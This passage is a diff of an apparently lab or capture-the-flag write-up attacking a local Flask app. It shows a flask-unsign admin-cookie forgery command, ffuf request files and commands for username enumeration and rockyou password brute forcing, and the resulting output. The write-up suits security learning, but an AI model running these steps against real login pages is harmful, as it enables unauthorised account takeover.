@@ -208,7 +208,129 @@ flask-unsign --sign --cookie '{"mode":"unsecure","role":"admin"}' --secret '<Red
 
 ### User Enumeration + Brute Force:
 ---
+>[!Tip]
+> Some Usernames are already taken
 
+- when we visit the `signup` page we can create a new account
+- here we could test `User Enumeration`
+- its possible that the backend doesnt accept a username that is already taken 
+- we can test it with `ffuf` 
+- to do this I created a file called `signup.rq` that, looks like this: 
+```http
+POST /signup HTTP/1.1
+Host: 127.0.0.1:8000
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=eyJtb2RlIjoidW5zZWN1cmUiLCJyb2xlIjoiZ3Vlc3QifQ.adkRtg.jmNVO8iiBfBtZglB7vtMWt8A56o
+User-Agent: curl/8.14.1
+Accept: */*
+Connection: keep-alive
+Content-Length: 43
+
+username=FUZZ&password=test&retype=test
+```
+- for this I just used my current `cookie` 
+- the request file contains all required headers so the server processes it as a valid signup request
+
+- now we can use the file with `ffuf` :  
+```bash
+ffuf --request signup.rq --request-proto http -w /usr/share/SecLists/Usernames/Names/names.txt -mr "taken"
+```
+- here we have to give `ffuf` the request file, wich protocol the webserver is using, a wordlist 
+- using `-mr "taken"` we filter responses that contain the string `taken`
+- so we are guessing here that the backend sends an `Username already taken` when we usernames is already taken 
+
+- we indeed found users: 
+```bash
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://127.0.0.1:8000/signup
+ :: Wordlist         : FUZZ: /usr/share/SecLists/Usernames/Names/names.txt
+ :: Header           : Accept: */*
+ :: Header           : Connection: keep-alive
+ :: Header           : Host: 127.0.0.1:8000
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Cookie: session=eyJtb2RlIjoidW5zZWN1cmUiLCJyb2xlIjoiZ3Vlc3QifQ.adoqlg.FaX4iih32h_LF5_-AFUk2W7sNIg
+ :: Header           : User-Agent: curl/8.14.1
+ :: Data             : username=FUZZ&password=test&retype=test
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Regexp: taken
+________________________________________________
+
+<Redacted>                  [Status: 200, Size: 2364, Words: 728, Lines: 58, Duration: 268ms]
+<Redacted>                   [Status: 200, Size: 2364, Words: 728, Lines: 58, Duration: 183ms]
+<Redacted>                    [Status: 200, Size: 2364, Words: 728, Lines: 58, Duration: 188ms]
+:: Progress: [10713/10713] :: Job [1/1] :: 222 req/sec :: Duration: [0:00:52] :: Errors: 0 ::
+```  
+
+- now we can try to brute force the passwords on the login page 
+- first I created a new request file called `login.rq`: 
+```bash
+POST /login HTTP/1.1
+Host: 127.0.0.1:8000
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=eyJtb2RlIjoidW5zZWN1cmUiLCJyb2xlIjoiZ3Vlc3QifQ.adoqlg.FaX4iih32h_LF5_-AFUk2W7sNIg
+User-Agent: curl/8.14.1
+Accept: */*
+Connection: keep-alive
+
+username=<Redacted>&password=FUZZ
+```
+
+- after this we can start `ffuf`: 
+```bash
+ffuf --request login.rq --request-proto http -w /usr/share/rockyou.txt -mc 302
+```
+- here we use `-mc` to match the response statuscode of `302`
+- because we can assume that when we got the right credentials, we get redirected to somewhere
+
+- and also here we something: 
+```bash
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://127.0.0.1:8000/login
+ :: Wordlist         : FUZZ: /usr/share/rockyou.txt
+ :: Header           : User-Agent: curl/8.14.1
+ :: Header           : Accept: */*
+ :: Header           : Connection: keep-alive
+ :: Header           : Host: 127.0.0.1:8000
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Cookie: session=eyJtb2RlIjoidW5zZWN1cmUiLCJyb2xlIjoiZ3Vlc3QifQ.adoqlg.FaX4iih32h_LF5_-AFUk2W7sNIg
+ :: Data             : username=<Redacted>&password=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 302
+________________________________________________
+
+<Redacted>                 [Status: 302, Size: 197, Words: 18, Lines: 6, Duration: 204ms]
+:: Progress: [1241/14344391] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+```
+
+- I also did it with the other usernames and checked the cookie that I got after logging
+- one had the `admin` role, one hat the `staff` role and the last had the `user` role
 
 
 ### RCE: 
